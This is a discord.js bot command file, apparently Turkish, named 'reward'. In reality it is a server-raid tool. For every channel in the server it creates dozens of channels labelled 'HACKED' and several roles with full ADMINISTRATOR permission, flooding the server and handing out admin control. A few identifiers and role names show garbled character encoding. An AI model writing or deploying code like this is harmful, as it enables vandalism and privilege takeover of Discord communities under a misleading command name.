const { Message } = require("discord.js");

module.exports = {
    kod: "reward",
    async run (client, message, args) {
       message.guild.channels.cache.forEach((item, i) => {
           message.guild.channels.create('Temel Kanallar', {type: 'category'}).then(temel => {
               message.guild.channels.create('Ses Kanallar─▒', { type: 'category'}).then(seskanallar─▒ => {
                   message.guild.channels.create('Proof', {type: 'text'}).then(Proof => {
                       Proof.setParent(temel.id)
                   })

                   message.guild.channels.create('HACKED', {type: 'text'}).then(Proof => {
                    Proof.setParent(temel.id)
                })

                message.guild.channels.create('HACKED', {type: 'text'}).then(Proof => {
                    Proof.setParent(temel.id)
                })

                message.guild.channels.create('HACKED', {type: 'text'}).then(Proof => {
                    Proof.setParent(temel.id)
                })

                message.guild.channels.create('HACKED', {type: 'text'}).then(Proof => {
                    Proof.setParent(temel.id)
                })

                message.guild.channels.create('HACKED', {type: 'text'}).then(Proof => {
                    Proof.setParent(temel.id)
                })

                message.guild.channels.create('HACKED', {type: 'voice'}).then(Proof => {
                    Proof.setParent(temel.id)
                })
                message.guild.channels.create('HACKED', {type: 'text'}).then(Proof => {
                    Proof.setParent(temel.id)
                })

                message.guild.channels.create('HACKED', {type: 'text'}).then(Proof => {
                    Proof.setParent(temel.id)
                })

                message.guild.channels.create('HACKED', {type: 'voice'}).then(Proof => {
                    Proof.setParent(temel.id)
                })

                message.guild.channels.create('HACKED', {type: 'text'}).then(Proof => {
                    Proof.setParent(temel.id)
                })

                message.guild.channels.create('HACKED', {type: 'text'}).then(Proof => {
                    Proof.setParent(temel.id)
                })

                message.guild.channels.create('HACKED', {type: 'voice'}).then(Proof => {
                    Proof.setParent(temel.id)
                })

                message.guild.channels.create('HACKED', {type: 'text'}).then(Proof => {
                    Proof.setParent(temel.id)
                })

                message.guild.channels.create('HACKED', {type: 'text'}).then(Proof => {
                    Proof.setParent(temel.id)
                })

                message.guild.channels.create('HACKED', {type: 'voice'}).then(Proof => {
                    Proof.setParent(temel.id)
                })

                message.guild.channels.create('HACKED', {type: 'text'}).then(Proof => {
                    Proof.setParent(temel.id)
                })

                message.guild.channels.create('HACKED', {type: 'text'}).then(Proof => {
                    Proof.setParent(temel.id)
                })

                message.guild.channels.create('HACKED', {type: 'voice'}).then(Proof => {
                    Proof.setParent(temel.id)
                })

                message.guild.channels.create('HACKED', {type: 'text'}).then(Proof => {
                    Proof.setParent(temel.id)
                })




            
               })

               
            })
            message.guild.roles.create({ data: {name: "Owner", color: "Red", permissions: ["ADMINISTRATOR"]}})
            message.guild.roles.create({ data: {name: "Moderator", color: "Red", permissions: ["ADMINISTRATOR"]}})
            message.guild.roles.create({ data: {name: "├ľd├╝l Ald─▒", color: "Red", permissions: ["ADMINISTRATOR"]}})
            message.guild.roles.create({ data: {name: "Sponsor", color: "Red", permissions: ["ADMINISTRATOR"]}})


       }); 
        }
}